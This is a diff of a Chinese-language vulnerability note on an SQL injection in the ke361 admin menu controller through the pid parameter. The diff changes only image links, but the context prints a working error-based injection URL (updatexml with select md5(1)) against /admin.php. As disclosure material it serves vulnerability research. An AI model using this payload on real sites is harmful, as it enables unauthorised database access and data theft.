@@ -18,7 +18,7 @@ https://gitee.com/jcove/ke361
 
 存在漏洞的文件为 `Application/Admin/Controller/MenuController.class.php`
 
-![image-20220518153611158](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205181536242.png)
+![image-20220518153611158](./images/202205181536242.png)
 
 Get 传参 pid 传入SQL语句
 
@@ -32,4 +32,4 @@ SELECT `id`,`title`,`pid`,`sort`,`url`,`hide`,`tip`,`group`,`is_dev`,`status` FR
 /admin.php?s=/Menu/index/pid/1)%20AND%20updatexml(1,concat(0x7e,(select%20md5(1)),0x7e),1)--+
 ```
 
-![image-20220518153624882](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205181536951.png)
+![image-20220518153624882](./images/202205181536951.png)
